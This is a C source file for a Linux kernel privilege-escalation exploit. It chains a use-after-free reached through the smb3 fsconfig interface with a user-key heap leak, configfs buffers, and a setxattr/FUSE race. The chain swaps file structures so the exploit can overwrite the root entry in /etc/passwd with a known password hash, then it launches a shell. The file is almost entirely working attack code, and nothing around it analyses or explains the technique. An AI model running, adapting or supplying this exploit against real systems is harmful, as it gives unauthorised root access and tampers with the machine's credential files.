#define _GNU_SOURCE
#define FUSE_USE_VERSION 29
#include <endian.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <sched.h>
#include <fcntl.h>
#include <pthread.h>
#include <poll.h>
#include <errno.h>
#include <sys/stat.h>
#include <fuse.h>
// #include <keyutils.h>
#include <semaphore.h>
#include <sys/mman.h>
#include <sys/eventfd.h>
#include <sys/xattr.h>
#include <sys/resource.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>






#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");
#define real(a) a+kernel_base-0xffffffff81000000
#define FILE_NUM 0x400




void leak(size_t *content,size_t size)
{
    printf("[*]Leak: ");
    for(int i=0;i<(int)(size/8);i++)
    {
       printf("%llx\n",content[i]);
    }
}


#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif

int pipefd[2];
char *tmp_content=NULL;
char buf[0x1000];
size_t tmp_buf[0x100];
size_t leak_buf[0x1000];
size_t file_leak_buf[0x200];
int file_fd[FILE_NUM];
int fd1,fd2;
int configfs_fd[0x50];
sem_t thread_mutex;
pthread_t setxattr_thread;
void *page_addr;
void *read_addr;
int offset;
int check_fd;
sem_t *sem,*sem2;
const char* sem_name = "/process_semaphore";
const char* sem_name2 = "/process_semaphore2";

void errExit(char * msg)
{
    printf("\033[31m\033[1m[x] Error : \033[0m%s\n",msg);
    exit(-1);
}

uint64_t r[1] = {0xffffffffffffffff};


// static const char *content = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
static const char *content = "Hello, World!\n";

static int getattr_callback(const char *path, struct stat *stbuf)
{
	puts("[+] getattr_callback");
	memset(stbuf, 0, sizeof(struct stat));

	if (strcmp(path, "/file") == 0) {
		stbuf->st_mode = S_IFREG | 0777;
		stbuf->st_nlink = 1;
		stbuf->st_size = strlen(content);
		return 0;
	}

	return -ENOENT;
}

void check(char *data)
{
  
}

static int open_callback(const char *path, struct fuse_file_info *fi)
{
	puts("[+] open_callback");
	return 0;
}

static int read_callback(const char *path, char *buf, size_t size, off_t offset,
			 struct fuse_file_info *fi)
{
	puts("[+] read_callback");
	if(access("/tmp/lotus7",F_OK)<0)
	{
		system("echo \"lotus\">/tmp/lotus7");
	}
	else
	{
		system("echo \"lotus\">/tmp/lotus77");
	}

  // int tmp_fd = open("/sys/kernel/config/usb_gadget/lotus/strings/0x409/manufacturer",O_RDWR);
  sem_post(sem);
  
  // if (tmp_fd<0)
  // {
  //   system("touch /tmp/fail");
  // }
  // else{
  //   system("touch tmp/success");
  // }

	if (strcmp(path, "/file") == 0) {

		size_t len = strlen(content);
		if (offset >= len)
			return 0;

		if ((size > len) || (offset + size > len)) {
			memcpy(buf, content + offset, len - offset);
      sem_wait(sem2);
			return len - offset;
		} else {
			memcpy(buf, content + offset, size);
      sem_wait(sem2);
			return size;
		}
	}
}

static struct fuse_operations fops = {
	.getattr = getattr_callback,
	.open = open_callback,
	.read = read_callback,
};

int add_user_key(char *description, char *payload, size_t payload_len)
{
    return syscall(__NR_add_key,"user", description, payload, payload_len, 
                   -1);
}

int key_read(int keyid, char *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, 11, keyid, buffer, buflen);
}

int key_delete(int keyid)
{
    return syscall(__NR_keyctl, 3, keyid, 0, 0, 0);
}

size_t find_the_victim_configfs_buffer(size_t *data)
{
    for(int idx=0;idx<0x200;idx++)
    {
        if(data[idx]==1&&data[idx+1]==0&&data[idx+2]>0xffff888000000000&&data[idx+3]>0xffffffff81000000&&data[idx+4]==0&&data[idx+5]==0)
        {
            return idx;
        }
    }
    return -1;
}

void setxattr_thread_func()
{
  sem_wait(&thread_mutex);
  puts("[*] Setxattr+fuse to control configfs_buffer.");
  leak_buf[offset]=0x1000;
  leak_buf[offset+0x8]=0;
  memcpy(read_addr+0x1000-0x78,leak_buf+offset,0x70);
  setxattr("/exp", "Lotus", read_addr+0x1000-0x78, 0x80, 0);
}

size_t find_the_victim_f_mapping(size_t *data)
{
  for(int idx=0;idx<0x200;idx+=0x20)
    {
      // printf("0x%x;0x%x\n",(data[idx+8]>>32);
        if((data[idx+8]>>32)==0x484a801d&&(data[idx+8+0x20]>>32)==0x484f801f)
        {
            data[idx+0x1b+0x20]=data[idx+0x1b];
            return 1;
        }
        else if((data[idx+8]>>32)==0x484f801f&&(data[idx+8+0x20]>>32)==0x484a801d)
        {
          data[idx+0x1b]=data[idx+0x1b+0x20];
          return 1;
        }
    }
    return -1;
}

static void adjust_rlimit() {
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = (200 << 20);
  setrlimit(RLIMIT_AS, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 32 << 20; 
  setrlimit(RLIMIT_MEMLOCK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  // setrlimit(RLIMIT_FSIZE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 1 << 20;
  setrlimit(RLIMIT_STACK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &rlim);
  // RLIMIT_FILE

 // RLIMIT_NOFILE 最大打开文件描述符限制，默认为 1024, 设置为4096
    rlim.rlim_cur = rlim.rlim_max = 4096;
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
      perror("[-] setrlimit");
    }
  
}


const char* my_argv[] = { "/exp", "/tmp/fuse/", NULL };

int get_root(int argc, char *argv[])
{

  puts("[*] Do some prepare.");

  sem = sem_open(sem_name, O_CREAT, S_IRUSR | S_IWUSR, 0);
    if (sem == SEM_FAILED) {
        perror("Error creating/opening semaphore");
        return 1;
    }

  sem2 = sem_open(sem_name2, O_CREAT, S_IRUSR | S_IWUSR, 0);
    if (sem == SEM_FAILED) {
        perror("Error creating/opening semaphore");
        return 1;
    }

  if (sem_init(&thread_mutex, 0, 0) != 0) {
        perror("sem_init");
        exit(1);
    }
  
  if(access("/tmp/fuse/",F_OK)<0)
  {
    system("mkdir /tmp/fuse/");
    if(!fork())
    {
        fuse_main(2, my_argv, &fops, NULL);
    }
  }
  
        /* create new namespace to get CAP_SYS_ADMIN */
  if (unshare(CLONE_NEWNS | CLONE_NEWUSER) < 0) {
            errExit("FAILED to unshare()!");
        }

  cpu_set_t cpu_set;

  CPU_ZERO(&cpu_set);
  CPU_SET(0, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
  adjust_rlimit();
  
  tmp_content = malloc(0x1000);
  
  
  // sem_wait(&mutex);
  sleep(2);
  int ffd = open("/tmp/fuse/file", O_RDWR);
  if(ffd<0)
  {
    errExit("open fuse file failed!");
  }
	page_addr = mmap(0x200000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE, ffd, 0);
  read_addr = mmap(0x1ff000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(read_addr!=0x1ff000||page_addr!=0x200000)
	{
		printf("0x%x,0x%x\n",read_addr,page_addr);
		puts("error!");
		return 0;
	}
  
  //  puts("open!");
  //  int len=write(fd,"Lotus",5);
  //  printf("len:%d\n",len);
  //  len = write(fd,"77777",5);
  //   printf("len:%d\n",len);
  syscall(__NR_mmap, /*addr=*/0x1ffff000ul, /*len=*/0x1000ul, /*prot=*/0ul,
          /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
  syscall(__NR_mmap, /*addr=*/0x20000000ul, /*len=*/0x1000000ul, /*prot=*/7ul,
          /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
  syscall(__NR_mmap, /*addr=*/0x21000000ul, /*len=*/0x1000ul, /*prot=*/0ul,
          /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
  intptr_t res = 0;
  memcpy((void*)0x20000080, "smb3\000", 5);
  res = syscall(__NR_fsopen, /*type=*/0x20000080ul, /*flags=*/0ul);
  if (res != -1)
    r[0] = res;
  memcpy((void*)0x20000040, "pass\000", 5);
  memset((void*)0x200000c0, 0x41, 0x6f);
  memcpy((void*)0x200000c0+0x6f, "\x00\x00", 2);
  syscall(__NR_fsconfig, /*fd=*/r[0], /*cmd=*/1ul, /*key=*/0x20000040ul,
          /*value=*/0x200000c0ul, /*aux=*/0ul);
  memcpy((void*)0x20000000, "bsize\000", 6);
  memcpy((void*)0x20000200, "0\000", 2);
  syscall(__NR_fsconfig, /*fd=*/r[0], /*cmd=*/1ul, /*key=*/0x20000000ul,
          /*value=*/0x20000200ul, /*aux=*/0ul);
  
  memcpy(&buf,"payload\x00",8);
  memset(tmp_content,0x50,0x70);
  // for(int j=0;j<0x70;j++)
  // {
    // memcpy(tmp_content, (char *)&j, 1);
  // }
  int leak_kid=add_user_key(&buf,tmp_content,0x70-0x18);
  printf("KID:%d\n",leak_kid);
  syscall(__NR_fsconfig, /*fd=*/r[0], /*cmd=*/1ul, /*key=*/0x20000000ul,
          /*value=*/0x20000200ul, /*aux=*/0ul);

  // memset(&buf,'G',0x70);
  // add_user_key(&buf,tmp_content,0x20);
  

  
  puts("[*] Open two configfs_file and init their pages");
  fd2 = open("/sys/kernel/config/usb_gadget/lotus/strings/0x409/manufacturer",O_RDWR);
  if(fd2<0)
  {
    errExit("open file2 failed!");
  }
  read(fd2,leak_buf,0x10);


  for(int i=0;i<0x10;i++)
  {
    configfs_fd[i] = open("/sys/kernel/config/usb_gadget/lotus/strings/0x409/manufacturer",O_RDWR);
    if(configfs_fd[i]<0)
    {
      errExit("open file failed!");
    }
    read(configfs_fd[i],leak_buf,0x10);
  }
  // fd1 = open("/sys/kernel/config/usb_gadget/lotus/strings/0x409/manufacturer",O_RDWR);
  // if(fd1<0)
  // {
  //   errExit("open file1 failed!");
  // }
  // read(fd1,leak_buf,0x10);

  // int fd3 = open("/sys/kernel/config/usb_gadget/lotus/strings/0x409/manufacturer",O_RDWR);
  // if(fd3<0)
  // {
  //   errExit("open file3 failed!");
  // }
  // read(fd3,leak_buf,0x10);


  //for test
  char tmp[0x400];
  memset(tmp,0x41,0x400);
  int size=0;
  // int max_size=0;
  size=write(fd2,tmp,0x200);



  int leak_size = key_read(leak_kid,leak_buf,0xf000);
  if(leak_size<0)
  {
    errExit("Leak error!");
  }


  

  offset = find_the_victim_configfs_buffer(leak_buf);
  if(offset>0)
  {
    BLUE puts("[*] Found the victim configfs_buffer."); CLOSE
    // getchar();
    puts("[*] Close the configfs_buffer and release its page.");
    // close(fd3);
    // close(fd1);
    for(int i=0;i<0x10;i++)
    {
      close(configfs_fd[i]);
    }
  }
  else{
    RED puts("[*] Not found the victim configfs_buffer."); CLOSE
    return -1;
  }


  
  
  // GREEN puts("Test:"); CLOSE
  



  // memset((void*)0x200000c0, 0x77, 0x6f);
  // memcpy((void*)0x200000c0+0x6f, "\x00\x00", 2);
  // syscall(__NR_fsconfig, /*fd=*/r[0], /*cmd=*/1ul, /*key=*/0x20000040ul,
          // /*value=*/0x200000c0ul, /*aux=*/0ul);

  memcpy(&buf,"payload1\x00",9);
  memset(tmp_content,0x66,0x70);
  add_user_key(&buf,tmp_content,0x70-0x18);

  // read(fd2,leak_buf,0x200);
  puts("[*] Spray target file struct to the uaf page...");
  memset(file_leak_buf,0,0x800);
    for (int i = 0; i < FILE_NUM; i++) 
    {
        if(i%2==0)
        {
          file_fd[i] = open("/etc/passwd",0);
          if (file_fd[i] < 0) 
          {
              errExit("FAILED to open pwd file!");
          }

          // read(fd2,leak_buf,0x200);
          // // setxattr("/exp", "Lotus", leak_buf+idx, 0x80, 0);
          // if(leak_buf[0x5]!=0)
          // {
          //   leak(leak_buf,0x100);
          // }
        }
        else{
          file_fd[i] = open("/tmp/lotus",O_RDWR);
          if (file_fd[i] < 0) 
          {
              errExit("FAILED to open normal file!");
          }
        }
        
        // printf("file %d down!\n",i);
    }

    syscall(__NR_fsconfig, /*fd=*/r[0], /*cmd=*/1ul, /*key=*/0x20000000ul,
          /*value=*/0x20000200ul, /*aux=*/0ul);
    

    int tmp_fd;
    // memset(tmp_buf,0,0x100);
    // leak_size = key_read(leak_kid,tmp_buf,0xf000);
    // printf("0x%x\n",leak_size);
    // leak(tmp_buf,0x58);
    // getchar();
    // for(int j=0;j<4;j++)
    // {
    //   cpu_set_t tmp_cpu_set;

    //   CPU_ZERO(&tmp_cpu_set);
    //   CPU_SET(j, &tmp_cpu_set);
    //   sched_setaffinity(getpid(), sizeof(tmp_cpu_set), &tmp_cpu_set);
    //   for(int i=0;i<0x20;i++)
    //   {
    //     tmp_fd = open("/sys/kernel/config/usb_gadget/lotus/strings/0x409/manufacturer",O_RDWR);
    //     if(tmp_fd<0)
    //     {
    //       errExit("open file2 failed!");
    //     }
    // }

    // }
    

    int result = pthread_create(&setxattr_thread, NULL, setxattr_thread_func, NULL);
    if (result != 0) {
        printf("Error creating thread. Code: %d\n", result);
        return 1;
    }

    int tmp_kid=0;
    for(int i=0;i<0x80;i++)
      {
        // printf("CPU:%d;try:0x%x\n",0,i);
        memset(tmp_content,0x77,0x70);
        tmp_kid=add_user_key(&buf,tmp_content,0x70-0x18);
        // printf("kid:%d\n",tmp_kid);
        leak_size = key_read(leak_kid,tmp_buf,0xf000);
        if(tmp_buf[0]==0x7777777777777777)
        {
          printf("release the user_key_payload\n");
          key_delete(tmp_kid);
          sleep(1);//let the buffer be free and we can use setxattr+fuse to control it.
          sem_post(&thread_mutex);
          
          break;
        }
        // tmp_fd = open("/sys/kernel/config/usb_gadget/lotus/strings/0x409/manufacturer",O_RDWR);
        // if(tmp_fd<0)
        // {
        //   errExit("open file2 failed!");
        // }
      }
    
    sem_wait(sem);
    // puts("here");
    read(fd2,(char*)(file_leak_buf) + 1,0xfff);
    // leak(file_leak_buf,0x800);
    sem_post(sem2);
    offset = find_the_victim_f_mapping(file_leak_buf);
    if(offset>0)
    {
      BLUE puts("[*] Found the file struct in the uaf page."); CLOSE
      // getchar();
      sleep(1);
      write(fd2,file_leak_buf,0xf00);
      
    }
    else{
      RED puts("[*] Not found the file struct in the uaf page."); CLOSE
      return -1;
    }

    char *data = "root:$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt Lotus Lotus
    printf("Setting root password to \"Lotus\"...\n");
    int data_size = strlen(data);

    puts("[*]finally: edit the pwd file");
    //what we want to edit pipe->page
    for (int i = 1;i < FILE_NUM; i+=2) {
        if(write(file_fd[i], data,data_size)>0)
        {
          // RED printf("success in write 0x%x\n",i); CLOSE
          sleep(0.1);
        }
        }
      write(pipefd[1],"A",1);


  sleep(10000);
  puts("never get there");
  return 0;
}

int main()
{
  char tmp_buffer[0x10];
  pipe(pipefd);
  if(fork())
  {
    get_root(2,my_argv);
  }

  else
  {
    read(pipefd[0],tmp_buffer,0x1);
    puts("Now the password is:");
    system("head -n 1 /etc/passwd");
    puts("");
    // char *argv[] = {"/bin/sh", "-c", "(echo Lotus; cat) | su - -c \""
    //                     "echo \\\"\033[31mDone! Popping shell... (run commands now)\\\";"
    //                     // "cp /tmp/passwd /etc/passwd;"
    //                     "/bin/sh;"
    //                 "\" root",NULL};
    // execv("/bin/sh", argv);
    system("/bin/sh");
  }



}
